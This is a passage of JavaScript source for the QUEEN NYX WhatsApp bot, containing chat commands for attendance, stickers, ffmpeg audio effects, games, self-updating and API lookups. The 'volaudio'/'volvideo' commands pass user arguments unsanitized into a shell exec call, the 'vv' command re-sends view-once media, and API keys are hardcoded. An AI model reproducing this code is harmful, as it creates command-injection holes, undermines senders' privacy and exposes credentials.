        throw 'Tidak ada proses absen yang sedang berlangsung di obrolan ini!';
    }
    absenData[chatId].participants.push(userId);

    replygcprexzy('Anda telah berhasil bergabung dalam proses absen!');
}
break;

case 'cekabsen': {
if (!isGroup) return replygcprexzy('Hanya Di Group')
    const chatId = m.chat; 
    if (!absenData[chatId]) {
        throw 'Tidak ada proses absen yang sedang berlangsung di obrolan ini!';
    }

    
    const participants = absenData[chatId].participants;

    replygcprexzy(`Daftar peserta absen:\n${participants.join(', ')}`);
}
break;

case 'hapusabsen': {
if (!isGroup) return replygcprexzy('Hanya Di Group')
    const chatId = m.chat;
    if (absenData[chatId] && absenData[chatId].admin === m.sender) {
      
        delete absenData[chatId];
        
        replygcprexzy('Proses absen telah dihapus!');
    } else {
        throw 'Anda tidak memiliki izin untuk menghapus proses absen!';
    }
}
break    
case 'update': {
    let repoUrl = 'https://raw.githubusercontent.com/Prexzybooster/QUEEN-NYX-BOT/main/';
    let versionFile = repoUrl + 'version.txt';
    let changelogFile = repoUrl + 'changelog.txt';
    let filesToUpdate = [
        'QueenNyx.js',
        'lib/listmenu.js',
        'version.json'
    ];

    try {
        let latestVersion = await fetch(versionFile).then(res => res.text()).catch(() => null);
        let currentVersion = require('./version.json').version;

        if (!latestVersion) throw new Error('❌ Failed to check version.');
        if (latestVersion.trim() === currentVersion.trim()) {
            return replygcprexzy('✅ QUEEN NYX is already up to date.');
        }

        let changelog = await fetch(changelogFile).then(res => res.text()).catch(() => 'No changelog available.');

        let updateMessage = `🚀 *QUEEN NYX Update Available!*\n\n📌 *Current Version:* ${currentVersion}\n📌 *New Version:* ${latestVersion}\n\n📜 *Changelog:*\n${changelog}\n\n🔄 *Updating now...*`;

        replygcprexzy(updateMessage);

        // Backup files before updating
        for (let file of filesToUpdate) {
            if (fs.existsSync(`./${file}`)) {
                fs.copyFileSync(`./${file}`, `./backup_${file.replace(/\//g, '_')}_${Date.now()}`);
            }
        }

        // Initialize Progress Bar
        let totalFiles = filesToUpdate.length;
        let progress = 0;

        function showProgress() {
            let percent = Math.floor((progress / totalFiles) * 100);
            let progressBar = `[${'='.repeat(progress)}${' '.repeat(totalFiles - progress)}] ${percent}%`;
            replygcprexzy(`⏳ Updating... ${progressBar}`);
        }

        // Fetch and update files
        for (let file of filesToUpdate) {
            let newFileContent = await fetch(repoUrl + file).then(res => res.text());
            fs.writeFileSync(`./${file}`, newFileContent);
            progress++;
            showProgress();
        }

        // Update version.json
        fs.writeFileSync('./version.json', JSON.stringify({ version: latestVersion.trim() }, null, 2));

        replygcprexzy('✅ *Update Completed! Restarting QUEEN NYX...*');
        setTimeout(() => {
            process.exit(1); // Auto-restart bot
        }, 2000);
    } catch (error) {
        replygcprexzy('❌ Update failed. Try again later.');
    }
}
break
case 'rollback': {
    let backups = fs.readdirSync('./').filter(file => file.startsWith('backup_')).sort().reverse();
    if (backups.length === 0) return replygcprexzy('❌ No backups found.');

    let filesToRestore = [
        'QueenNyx.js',
        'lib/listmenu.js'
    ];

    for (let file of filesToRestore) {
        let backupFile = backups.find(b => b.includes(file.replace(/\//g, '_')));
        if (backupFile) {
            fs.copyFileSync(backupFile, `./${file}`);
        }
    }

    replygcprexzy('✅ Successfully rolled back to the previous version. Restarting QUEEN NYX...');
    setTimeout(() => {
        process.exit(1); // Restart bot
    }, 2000);
}
break
case 'aza':
                let textnate = `Hello Brother ${pushname}\n\nAbeg Press me money,e no easy to develop bot`
                PrexzyVilla.sendMessage(m.chat, {
                    text: 'Kuda: 2005064719,Abigail \n\n' + textnate
                }, {
                    quoted: m
                })
                break
            case 'owner': {
                PrexzyVilla.sendMessage(from, {
                    contacts: {
                        displayName: `${list.length} Contact`,
                        contacts: list
                    }
                }, {
                    quoted: m
                })
            }
            break
            //convert
case 's': case 'sticker': case 'stiker': {
if (!quoted) return replygcprexzy(`Send/Reply Images/Videos/Gifs With Captions ${prefix+command}\nVideo Duration 1-9 Seconds`)
if (/image/.test(mime)) {
let media = await quoted.download()
let encmedia = await PrexzyVilla.sendImageAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return replygcprexzy('Send/Reply Images/Videos/Gifs With Captions ${prefix+command}\nVideo Duration 1-9 Seconds')
let media = await quoted.download()
let encmedia = await PrexzyVilla.sendVideoAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
} else {
replygcprexzy(`Send/Reply Images/Videos/Gifs With Captions ${prefix+command}\nVideo Duration 1-9 Seconds`)
}
}
break
            case 'swm': case 'steal': case 'stickerwm': case 'take':{
if (!isPremium) return replyprem(mess.premium)
if (!args.join(" ")) return replygcprexzy(`Where is the text?`)
const swn = args.join(" ")
const pcknm = swn.split("|")[0]
const atnm = swn.split("|")[1]
if (m.quoted.isAnimated === true) {
PrexzyVilla.downloadAndSaveMediaMessage(quoted, "gifee")
PrexzyVilla.sendMessage(from, {sticker:fs.readFileSync("gifee.webp")},{quoted:m})
} else if (/image/.test(mime)) {
let media = await quoted.download()
let encmedia = await PrexzyVilla.sendImageAsSticker(m.chat, media, m, { packname: pcknm, author: atnm })
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return replygcprexzy('Maximum 10 Seconds!')
let media = await quoted.download()
let encmedia = await PrexzyVilla.sendVideoAsSticker(m.chat, media, m, { packname: pcknm, author: atnm })
} else {
replygcprexzy(`Photo/Video?`)
}
}
break
            case 'toimage':
            case 'toimg': {
                if (!/webp/.test(mime)) return replygcprexzy(`Reply sticker with caption *${prefix + command}*`)
                await PrexzyStickWait()
                let media = await PrexzyVilla.downloadAndSaveMediaMessage(qmsg)
                let ran = await getRandom('.png')
                exec(`ffmpeg -i ${media} ${ran}`, (err) => {
                    fs.unlinkSync(media)
                    if (err) return err
                    let buffer = fs.readFileSync(ran)
                    PrexzyVilla.sendMessage(m.chat, {
                        image: buffer
                    }, {
                        quoted: m
                    })
                    fs.unlinkSync(ran)
                })

            }
            break
case 'matchpredict': {
    let apiKey = 'd4fdb3cfcdb511ff1b0898d07831732d'; // Your API key
    let today = new Date().toISOString().split('T')[0]; // Get today's date
    let apiUrl = `https://v3.football.api-sports.io/fixtures?date=${today}`;

    try {
        let response = await fetch(apiUrl, {
            headers: { 'x-apisports-key': apiKey }
        });
        let data = await response.json();

        if (!data.response || data.response.length === 0) {
            return replygcprexzy(`❌ No matches available for today.`);
        }

        let match = data.response[Math.floor(Math.random() * data.response.length)]; // Random match from today's games
        let homeTeam = match.teams.home.name;
        let awayTeam = match.teams.away.name;

        // Fetch match prediction
        let predictionUrl = `https://v3.football.api-sports.io/predictions?fixture=${match.fixture.id}`;
        let predictionResponse = await fetch(predictionUrl, {
            headers: { 'x-apisports-key': apiKey }
        });
        let predictionData = await predictionResponse.json();

        if (!predictionData.response || predictionData.response.length === 0) {
            return replygcprexzy(`❌ No prediction available for *${homeTeam} vs ${awayTeam}*`);
        }

        let prediction = predictionData.response[0];
        let homeWin = prediction.predictions.percent.home || 'N/A';
        let draw = prediction.predictions.percent.draw || 'N/A';
        let awayWin = prediction.predictions.percent.away || 'N/A';
        let expectedScore = prediction.predictions.advice || 'No score prediction available';

        let responseMessage = `⚽ *Football Match Prediction* ⚽\n\n🏟 *Match:* ${homeTeam} vs ${awayTeam}\n📅 *Date:* ${today}\n\n📊 *Win Probability:*\n✅ ${homeTeam}: ${homeWin}%\n➖ Draw: ${draw}%\n✅ ${awayTeam}: ${awayWin}%\n\n🔢 *Expected Score:* ${expectedScore}\n\nDONE BY QUEEN NYX 👑`;

        replygcprexzy(responseMessage);

    } catch (error) {
        console.error(error);
        replygcprexzy(`❌ Error fetching match predictions. Try again later.\n\nDONE BY QUEEN NYX 👑`);
    }
}
break
            case 'tomp4':
            case 'tovideo': {
                if (!/webp/.test(mime)) return replygcprexzy(`Reply sticker with caption *${prefix + command}*`)
                await PrexzyStickWait()
                let media = await PrexzyVilla.downloadAndSaveMediaMessage(qmsg)
                let webpToMp4 = await webp2mp4File(media)
                await PrexzyVilla.sendMessage(m.chat, {
                    video: {
                        url: webpToMp4.result,
                        caption: 'Convert Webp To Video'
                    }
                }, {
                    quoted: m
                })
                await fs.unlinkSync(media)

            }
            break
            case 'toaud':
            case 'toaudio': {
                if (!/video/.test(mime) && !/audio/.test(mime)) return replygcprexzy(`Send/Reply Video/Audio that you want to make into audio with captions ${prefix + command}`)
                await PrexzyStickWait()
                let media = await PrexzyVilla.downloadMediaMessage(qmsg)
                let audio = await toAudio(media, 'mp4')
                PrexzyVilla.sendMessage(m.chat, {
                    audio: audio,
                    mimetype: 'audio/mpeg'
                }, {
                    quoted: m
                })

            }
            break
            case 'tomp3': {
                if (!/video/.test(mime) && !/audio/.test(mime)) return replygcprexzy(`Send/Reply Video/Audio that you want to make into MP3 with captions ${prefix + command}`)
                await PrexzyStickWait()
                let media = await PrexzyVilla.downloadMediaMessage(qmsg)
                let audio = await toAudio(media, 'mp4')
                PrexzyVilla.sendMessage(m.chat, {
                    document: audio,
                    mimetype: 'audio/mp3',
                    fileName: `nyx.mp3`
                }, {
                    quoted: m
                })

            }
            break
            case 'tovn':
            case 'toptt': {
                if (!/video/.test(mime) && !/audio/.test(mime)) return replygcprexzy(`Send/Reply Video/Audio that you want to make into a VN with captions ${prefix + command}`)
                await PrexzyStickWait()
                let media = await PrexzyVilla.downloadMediaMessage(qmsg)
                let {
                    toPTT
                } = require('./lib/converter')
                let audio = await toPTT(media, 'mp4')
                PrexzyVilla.sendMessage(m.chat, {
                    audio: audio,
                    mimetype: 'audio/mpeg',
                    ptt: true
                }, {
                    quoted: m
                })

            }
            break
            case 'togif': {
                if (!/webp/.test(mime)) return replygcprexzy(`Reply sticker with caption *${prefix + command}*`)
                await PrexzyStickWait()
                let media = await PrexzyVilla.downloadAndSaveMediaMessage(qmsg)
                let webpToMp4 = await webp2mp4File(media)
                await PrexzyVilla.sendMessage(m.chat, {
                    video: {
                        url: webpToMp4.result,
                        caption: 'Convert Webp To Video'
                    },
                    gifPlayback: true
                }, {
                    quoted: m
                })
                await fs.unlinkSync(media)

            }
            break
                        case 'vv': case 'rvo': {
	if (!m.quoted) return replygcPrexzy(`Reply to view once message`)
	if (m.quoted.mtype !== 'viewOnceMessageV2') return replygcPrexzy(`This is not a view once message`)
    let msg = m.quoted.message
    let type = Object.keys(msg)[0]
    let media = await downloadContentFromMessage(msg[type], type == 'imageMessage' ? 'image' : 'video')
    let buffer = Buffer.from([])
    for await (const chunk of media) {
        buffer = Buffer.concat([buffer, chunk])
    }
    if (/video/.test(type)) {
        return PrexzyVilla.sendFile(m.chat, buffer, 'media.mp4', msg[type].caption || '', m)
    } else if (/image/.test(type)) {
        return PrexzyVilla.sendFile(m.chat, buffer, 'media.jpg', msg[type].caption || '', m)
    }
}
break
case 'riddleme': {
    try {
        let response = await fetch('https://riddles-api.vercel.app/random');
        let data = await response.json();

        if (!data || !data.riddle || !data.answer) {
            return replygcprexzy("❌ Unable to fetch a riddle. Try again later.");
        }

        global.currentRiddle = data; // Store the riddle for checking the answer

        replygcprexzy(`🧩 *RIDDLE CHALLENGE!* 🧩\n\n❓ *Question:* ${data.riddle}\n\n🧐 Reply with your answer using: ${prefix}answer <your answer>\n\nDONE BY QUEEN NYX 👑`);
    } catch (error) {
        console.error(error);
        replygcprexzy("❌ Error fetching riddle. Try again later.\n\nDONE BY QUEEN NYX 👑");
    }
}
break

case 'answer': {
    if (!global.currentRiddle) return replygcprexzy("❌ No riddle is currently active! Use *riddleme* to get one.");
    if (!text) return replygcprexzy("⚠️ Please provide an answer!");

    let userAnswer = text.toLowerCase();
    let correctAnswer = global.currentRiddle.answer.toLowerCase();

    if (userAnswer === correctAnswer) {
        replygcprexzy(`✅ *Correct!* 🎉 The answer is *${global.currentRiddle.answer}*!\n\nDONE BY QUEEN NYX 👑`);
        global.currentRiddle = null; // Reset riddle
    } else {
        replygcprexzy(`❌ *Wrong!* Try again, or type *riddleme* for a new challenge.`);
    }
}
break
            case 'emojimix': {
                let [emoji1, emoji2] = text.split`+`
                if (!emoji1) return replygcprexzy(`Example : ${prefix + command} 😅+🤔`)
                if (!emoji2) return replygcprexzy(`Example : ${prefix + command} 😅+🤔`)
                await PrexzyStickWait()
                let anu = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(emoji1)}_${encodeURIComponent(emoji2)}`)
                for (let res of anu.results) {
                    let encmedia = await PrexzyVilla.sendImageAsSticker(m.chat, res.url, m, {
                        packname: global.packname,
                        author: global.author,
                        categories: res.tags
                    })
                }
            }
            break
            case 'emojimix2': {
                if (!text) return replygcprexzy(`Example : ${prefix + command} 😅`)
                let anu = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(text)}`)
                for (let res of anu.results) {
                    let encmedia = await PrexzyVilla.sendImageAsSticker(m.chat, res.url, m, {
                        packname: global.packname,
                        author: global.author,
                        categories: res.tags
                    })
                }
            }
            break
            case 'toonce':
            case 'toviewonce': {
                if (!quoted) return replygcprexzy(`Reply Image/Video`)
                if (/image/.test(mime)) {
                    anuan = await PrexzyVilla.downloadAndSaveMediaMessage(quoted)
                    PrexzyVilla.sendMessage(m.chat, {
                        image: {
                            url: anuan
                        },
                        caption: mess.done,
                        fileLength: "999",
                        viewOnce: true
                    }, {
                        quoted: m
                    })
                } else if (/video/.test(mime)) {
                    anuanuan = await PrexzyVilla.downloadAndSaveMediaMessage(quoted)
                    PrexzyVilla.sendMessage(m.chat, {
                        video: {
                            url: anuanuan
                        },
                        caption: mess.done,
                        fileLength: "99999999",
                        viewOnce: true
                    }, {
                        quoted: m
                    })
                } else if (/audio/.test(mime)) {
                   bebasap = await PrexzyVilla.downloadAndSaveMediaMessage(quoted)
                   PrexzyVilla.sendMessage(m.chat, {
                     audio: {
                        url: bebasap
                     },
                     mimetype: 'audio/mpeg',
                     ptt: true,
                     viewOnce: true
                   })
                }
            }
            break
            case 'fliptext': {
                if (args.length < 1) return replygcprexzy(`Example:\n${prefix}fliptext prexzy`)
                quere = args.join(" ")
                flipe = quere.split('').reverse().join('')
                replygcprexzy(`\`\`\`「 FLIP TEXT 」\`\`\`\n*•> Normal :*\n${quere}\n*•> Flip :*\n${flipe}`)
            }
            break
            case 'toqr':{
  if (!q) return replygcprexzy(' Please include link or text!')
   const QrCode = require('qrcode-reader')
   const qrcode = require('qrcode')
   let qyuer = await qrcode.toDataURL(q, { scale: 35 })
   let data = new Buffer.from(qyuer.replace('data:image/png;base64,', ''), 'base64')
   let buff = getRandom('.jpg')
   await fs.writeFileSync('./'+buff, data)
   let medi = fs.readFileSync('./' + buff)
  await PrexzyVilla.sendMessage(from, { image: medi, caption:"Here you go!"}, { quoted: m })
   setTimeout(() => { fs.unlinkSync(buff) }, 10000)
  }
  break
  case 'volaudio': {
if (!args.join(" ")) return replygcprexzy(`Example: ${prefix + command} 10`)
media = await PrexzyVilla.downloadAndSaveMediaMessage(quoted, "volume")
rname = getRandom('.mp3')
exec(`ffmpeg -i ${media} -filter:a volume=${args[0]} ${rname}`, (err, stderr, stdout) => {
fs.unlinkSync(media)
if (err) return replygcprexzy('Error!')
jadie = fs.readFileSync(rname)
PrexzyVilla.sendMessage(from, {audio:jadie, mimetype: 'audio/mp4', ptt: true}, {quoted: m})
fs.unlinkSync(rname)
})
}
break
case 'volvideo': {
if (!args.join(" ")) return replygcprexzy(`Example: ${prefix + command} 10`)
media = await PrexzyVilla.downloadAndSaveMediaMessage(quoted, "volume")
rname = getRandom('.mp4')
exec(`ffmpeg -i ${media} -filter:a volume=${args[0]} ${rname}`, (err, stderr, stdout) => {
fs.unlinkSync(media)
if (err) return replygcprexzy('Error!')
jadie = fs.readFileSync(rname)
PrexzyVilla.sendMessage(from, {video:jadie, mimetype: 'video/mp4'}, {quoted: m})
fs.unlinkSync(rname)
})
}
break
case 'hackernews': {
    let response = await fetch(`https://hacker-news.firebaseio.com/v0/topstories.json`);
    let stories = await response.json();

    if (!stories || stories.length === 0) return replygcprexzy("❌ No news found!");

    let news = await Promise.all(stories.slice(0, 5).map(async (id) => {
        let res = await fetch(`https://hacker-news.firebaseio.com/v0/item/${id}.json`);
        return await res.json();
    }));

    let newsText = news.map(n => `📌 *${n.title}*\n🔗 ${n.url}\n`).join("\n");

    replygcprexzy(`🛡 *Latest Hacking & Cybersecurity News* 🛡\n\n${newsText}\n\nDONE BY QUEEN NYX 👑`);
}
break
case 'bass': case 'blown': case 'deep': case 'earrape': case 'fast': case 'fat': case 'nightcore': case 'reverse': case 'robot': case 'slow': case 'smooth': case 'squirrel':
                try {
                let set
                if (/bass/.test(command)) set = '-af equalizer=f=54:width_type=o:width=2:g=20'
                if (/blown/.test(command)) set = '-af acrusher=.1:1:64:0:log'
                if (/deep/.test(command)) set = '-af atempo=4/4,asetrate=44500*2/3'
                if (/earrape/.test(command)) set = '-af volume=12'
                if (/fast/.test(command)) set = '-filter:a "atempo=1.63,asetrate=44100"'
                if (/fat/.test(command)) set = '-filter:a "atempo=1.6,asetrate=22100"'
                if (/nightcore/.test(command)) set = '-filter:a atempo=1.06,asetrate=44100*1.25'
                if (/reverse/.test(command)) set = '-filter_complex "areverse"'
                if (/robot/.test(command)) set = '-filter_complex "afftfilt=real=\'hypot(re,im)*sin(0)\':imag=\'hypot(re,im)*cos(0)\':win_size=512:overlap=0.75"'
                if (/slow/.test(command)) set = '-filter:a "atempo=0.7,asetrate=44100"'
                if (/smooth/.test(command)) set = '-filter:v "minterpolate=\'mi_mode=mci:mc_mode=aobmc:vsbmc=1:fps=120\'"'
                if (/squirrel/.test(command)) set = '-filter:a "atempo=0.5,asetrate=65100"'
                if (/audio/.test(mime)) {
                await PrexzyStickWait()
                let media = await PrexzyVilla.downloadAndSaveMediaMessage(quoted)
                let ran = getRandom('.mp3')
                exec(`ffmpeg -i ${media} ${set} ${ran}`, (err, stderr, stdout) => {
                fs.unlinkSync(media)
                if (err) return replygcprexzy(err)
                let buff = fs.readFileSync(ran)
                PrexzyVilla.sendMessage(m.chat, { audio: buff, mimetype: 'audio/mpeg' }, { quoted : m })
                fs.unlinkSync(ran)
                })
                } else replygcprexzy(`Reply to the audio you want to change with a caption *${prefix + command}*`)
                } catch (e) {
                replygcprexzy(e)
                }
                break
                //media db
  case 'listbadword':{
let teks = '┌──⭓「 *VN List* 」\n│\n'
for (let x of bad) {
teks += `│⭔ ${x}\n`
}
teks += `│\n└────────────⭓\n\n*Totally there are : ${bad.length}*`
replygcprexzy(teks)
}
break
case 'dreaminterpret': {
    if (!text) return replygcprexzy(`Example: ${prefix + command} I saw a flying horse`);

    let response = await fetch(`https://api.dreamapi.com/interpret?query=${encodeURIComponent(text)}`);
    let data = await response.json();

    if (!data || !data.interpretation) return replygcprexzy("❌ Unable to interpret this dream!");

    replygcprexzy(`💭 *Dream Interpretation* 💭\n\n🔮 *Dream:* ${text}\n📜 *Meaning:* ${data.interpretation}\n\nDONE BY QUEEN NYX 👑`);
}
break
case 'celebritylookalike': {
    if (!m.quoted || !m.quoted.image) return replygcprexzy("📸 Please reply to an image!");

    let media = await m.quoted.download();
    let formData = new FormData();
    formData.append('file', media, 'image.jpg');

    let response = await fetch('https://api.celebslike.me/detect', {
        method: 'POST',
        body: formData
    });

    let result = await response.json();
    if (!result || !result.match) return replygcprexzy("❌ No match found!");

    replygcprexzy(`✨ *Celebrity Match Found!* \n\n👤 *You Look Like:* ${result.match.name}\n🎭 *Accuracy:* ${result.match.accuracy}%\n\nDONE BY QUEEN NYX 👑`);
}
break
case 'deepfake': {
    let response = await fetch(`https://thispersondoesnotexist.com/image`);
    let imageBuffer = await response.buffer();

    PrexzyVilla.sendMessage(m.chat, {
        image: imageBuffer,
        caption: `🤖 *AI Deepfake Generated!* \n\nDONE BY QUEEN NYX 👑`
    }, { quoted: m });
}
break

            //game
            case 'ttc':
            case 'ttt':
            case 'tictactoe': {
                let TicTacToe = require("./lib/tictactoe")
                this.game = this.game ? this.game : {}
                if (Object.values(this.game).find(room => room.id.startsWith('tictactoe') && [room.game.playerX, room.game.playerO].includes(m.sender))) return replygcprexzy('You are still in the game')
                let room = Object.values(this.game).find(room => room.state === 'WAITING' && (text ? room.name === text : true))
                if (room) {
                    replygcprexzy('Partner not found!')
                    room.o = m.chat
                    room.game.playerO = m.sender
                    room.state = 'PLAYING'
                    let arr = room.game.render().map(v => {
                        return {
                            X: '❌',
                            O: '⭕',
                            1: '1️⃣',
                            2: '2️⃣',
                            3: '3️⃣',
                            4: '4️⃣',
                            5: '5️⃣',
                            6: '6️⃣',
                            7: '7️⃣',
                            8: '8️⃣',
                            9: '9️⃣',
                        } [v]
                    })
                    let str = `Room ID: ${room.id}

${arr.slice(0, 3).join('')}
${arr.slice(3, 6).join('')}
${arr.slice(6).join('')}

Wait @${room.game.currentTurn.split('@')[0]}

Type *surrender* to give up and admit defeat`
                    if (room.x !== room.o) await PrexzyVilla.sendText(room.x, str, m, {
                        mentions: parseMention(str)
                    })
                    await PrexzyVilla.sendText(room.o, str, m, {
                        mentions: parseMention(str)
                    })
                } else {
                    room = {
                        id: 'tictactoe-' + (+new Date),
                        x: m.chat,
                        o: '',
                        game: new TicTacToe(m.sender, 'o'),
                        state: 'WAITING'
                    }
                    if (text) room.name = text
                    replygcprexzy('Waiting for partner' + (text ? ` type the command below ${prefix}${command} ${text}` : ''))
                    this.game[room.id] = room
                }
            }
            break
case 'truthordare': {
    try {
        let response = await fetch('https://api.truthordarebot.xyz/v1/truth');
        let truthData = await response.json();

        let response2 = await fetch('https://api.truthordarebot.xyz/v1/dare');
        let dareData = await response2.json();

        if (!truthData || !truthData.question || !dareData || !dareData.question) {
            return replygcprexzy("❌ Unable to fetch Truth or Dare challenges. Try again later.");
        }

        replygcprexzy(`😈 *TRUTH OR DARE?* 😈\n\n💬 *Truth:* ${truthData.question}\n🔥 *Dare:* ${dareData.question}\n\n💡 Reply with *truth* or *dare* to choose!\n\nDONE BY QUEEN NYX 👑`);
    } catch (error) {
        console.error(error);
        replygcprexzy("❌ Error fetching Truth or Dare. Try again later.\n\nDONE BY QUEEN NYX 👑");
    }
}
break
            case 'delttc':
            case 'delttt': {
                this.game = this.game ? this.game : {}
                try {
                    if (this.game) {
                        delete this.game
                        PrexzyVilla.sendText(m.chat, `Berhasil delete session TicTacToe`, m)
                    } else if (!this.game) {
                        replygcprexzy(`Session TicTacToe🎮 tidak ada`)
                    } else mewReply('?')
                } catch (e) {
                    replygcprexzy('rusak')
                }
            }
            break
            case 'suitpvp':
            case 'suit': {
                this.suit = this.suit ? this.suit : {}
                let poin = 10
                let poin_lose = 10
                let timeout = 60000
                if (Object.values(this.suit).find(roof => roof.id.startsWith('suit') && [roof.p, roof.p2].includes(m.sender))) replygcprexzy(`Finish your previous suit`)
                if (m.mentionedJid[0] === m.sender) return replygcprexzy(`Can't play with myself !`)
                if (!m.mentionedJid[0]) return replygcprexzy(`_Who do you want to challenge?_\nTag the person..\n\nExample : ${prefix}suit @${owner[1]}`, m.chat, {
                    mentions: [owner[1] + '@s.whatsapp.net']
                })
                if (Object.values(this.suit).find(roof => roof.id.startsWith('suit') && [roof.p, roof.p2].includes(m.mentionedJid[0]))) return replygcprexzy(`The person you are challenging is playing suit with someone else :(`)
                let id = 'suit_' + new Date() * 1
                let caption = `_*SUIT PvP*_

@${m.sender.split`@`[0]} challenged @${m.mentionedJid[0].split`@`[0]} to play suits

Please @${m.mentionedJid[0].split`@`[0]} to type accept/reject`
                this.suit[id] = {
                    chat: await PrexzyVilla.sendText(m.chat, caption, m, {
                        mentions: parseMention(caption)
                    }),
                    id: id,
                    p: m.sender,
                    p2: m.mentionedJid[0],
                    status: 'wait',
                    waktu: setTimeout(() => {
                        if (this.suit[id]) PrexzyVilla.sendText(m.chat, `_Suit time is up_`, m)
                        delete this.suit[id]
                    }, 60000),
                    poin,
                    poin_lose,
                    timeout
                }
            }
            break
            case 'mathquiz': case 'math': {
                if (kuismath.hasOwnProperty(m.sender.split('@')[0])) replygcprexzy(`There are still unfinished sessions!`)
                let { genMath, modes } = require('./lib/math')
                if (!text) return replygcprexzy(`Mode: ${Object.keys(modes).join(' | ')}\nUsage example: ${prefix}math medium`)
                let result = await genMath(text.toLowerCase())
                PrexzyVilla.sendText(m.chat, `*What is the result of: ${result.soal.toLowerCase()}*?\n\nTime: ${(result.waktu / 1000).toFixed(2)} second`, m).then(() => {
                    kuismath[m.sender.split('@')[0]] = result.jawaban
                })
                await sleep(result.waktu)
                if (kuismath.hasOwnProperty(m.sender.split('@')[0])) {
                    console.log("Answer: " + result.jawaban)
                    replygcprexzy("Time has run out\nAnswer: " + kuismath[m.sender.split('@')[0]])
                    delete kuismath[m.sender.split('@')[0]]
                }
            }
            break
            case 'afk': {
                let user = global.db.data.users[m.sender]
                user.afkTime = + new Date
                user.afkReason = text
                replygcprexzy(`${m.pushName} *Has Gone AFK*${text ? ': ' + text : ''}`)
            }
            break	
case 'fakelocation': {
    try {
        let response = await fetch('https://randomuser.me/api/');
        let data = await response.json();

        if (!data || !data.results || data.results.length === 0) {
            return replygcprexzy("❌ Unable to generate a fake location. Try again later.");
        }

        let location = data.results[0].location;
        let fakeLocMessage = `📍 *FAKE LOCATION GENERATED!* 📍\n\n🏙️ *City:* ${location.city}\n🌍 *Country:* ${location.country}\n📌 *Coordinates:* ${location.coordinates.latitude}, ${location.coordinates.longitude}\n\nDONE BY QUEEN NYX 👑`;

        replygcprexzy(fakeLocMessage);
    } catch (error) {
        console.error(error);
        replygcprexzy("❌ Error generating fake location. Try again later.\n\nDONE BY QUEEN NYX 👑");
    }
}
break
case 'celebritydeath': {
    if (!text) return replygcprexzy(`Example: ${prefix + command} Michael Jackson`);

    try {
        let response = await fetch(`https://api.api-ninjas.com/v1/celebrity?name=${encodeURIComponent(text)}`, {
            headers: { 'X-Api-Key': 'YOUR_API_KEY_HERE' } // Replace with API key from API-Ninjas
        });

        let data = await response.json();

        if (!data || data.length === 0) {
            return replygcprexzy(`❌ No data found for *${text}*.`);
        }

        let celeb = data[0];
        let deathStatus = celeb.death ? `⚰️ *Died on:* ${celeb.death}` : `✅ *Alive*`;

        let celebMessage = `🎭 *CELEBRITY STATUS CHECK* 🎭\n\n👤 *Name:* ${celeb.name}\n📅 *Born:* ${celeb.birth}\n${deathStatus}\n\nDONE BY QUEEN NYX 👑`;

        replygcprexzy(celebMessage);
    } catch (error) {
        console.error(error);
        replygcprexzy("❌ Error fetching celebrity data. Try again later.\n\nDONE BY QUEEN NYX 👑");
    }
}
break
case 'upch': {
    if (!PrexzyTheCreator) return replygcprexzy(mess.owner);
    if (!global.idch) return replygcprexzy('❌ WhatsApp Channel ID is not set. Please configure it in settings.js.');

    try {
        let ppuser;
        try {
            ppuser = await PrexzyVilla.profilePictureUrl(m.sender, 'image');
        } catch (err) {
            ppuser = 'https://files.catbox.moe/kp8w9p.jpeg';
        }

        let fotoProfil = await getBuffer(ppuser);
        let senderName = `Message from ${m.pushName}`;
        let defaultCaption = "✨ This media is sent via an automated system ✨";

        if (!m.quoted && !text) {
            return replygcprexzy("⚠️ Please send media or text before using this command.");
        }

        let mime = (m.quoted.msg || m.quoted).mimetype || '';
        let media = mime ? await m.quoted.download() : null;

        let messageContent = {
            contextInfo: {
                externalAdReply: {
                    showAdAttribution: true,
                    title: senderName,
                    mediaType: 1,
                    previewType: 1,
                    body: 'Message to channel',
                    thumbnail: fotoProfil,
                    renderLargerThumbnail: false,
                    mediaUrl: '',
                    sourceUrl: ''
                }
            }
        };

        if (/image/.test(mime)) {
            messageContent.image = media;
            messageContent.caption = text ? text : defaultCaption;
            await PrexzyVilla.sendMessage(global.idch, messageContent);
            replygcprexzy(`📸 *Image uploaded to the channel!*\n\n✅ Caption: "${text ? text : defaultCaption}"`);
        } 
        else if (/video/.test(mime)) {
            messageContent.video = media;
            messageContent.caption = text ? text : defaultCaption;
            await PrexzyVilla.sendMessage(global.idch, messageContent);
            replygcprexzy(`🎥 *Video uploaded to the channel!*\n\n✅ Caption: "${text ? text : defaultCaption}"`);
        } 
        else if (/audio/.test(mime)) {
            messageContent.audio = media;
            messageContent.mimetype = mime;
            messageContent.ptt = true;
            await PrexzyVilla.sendMessage(global.idch, messageContent);
            replygcprexzy(`🎵 *Audio uploaded to the channel!*`);
        } 
        else if (text) {
            messageContent.text = text;
            await PrexzyVilla.sendMessage(global.idch, messageContent);
            replygcprexzy(`💬 *Text message sent to the channel!*\n\n✅ Message: "${text}"`);
        } 
        else {
            replygcprexzy(`⚠️ Unsupported media type. Please check again.`);
        }
        
    } catch (error) {
        console.error(error);
        replygcprexzy(`❌ *Failed to upload to the channel. Try again later.*\n\nDONE BY QUEEN NYX 👑`);
    }
}
break
case 'cursedjoke': {
    try {
        let response = await fetch('https://v2.jokeapi.dev/joke/Dark?type=twopart');
        let data = await response.json();

        if (!data || !data.setup || !data.delivery) {
            return replygcprexzy("❌ Unable to fetch a cursed joke. Try again later.");
        }

        let jokeMessage = `😈 *CURSED JOKE* 😈\n\n😂 ${data.setup}\n🤣 ${data.delivery}\n\nDONE BY QUEEN NYX 👑`;

        replygcprexzy(jokeMessage);
    } catch (error) {
        console.error(error);
        replygcprexzy("❌ Error fetching joke. Try again later.\n\nDONE BY QUEEN NYX 👑");
    }
}
break
case 'ai':  
case 'ask':  
case 'openai': {  
    if (db.data.users[sender].limit < 1) return replygcprexzy(mess.limit);  
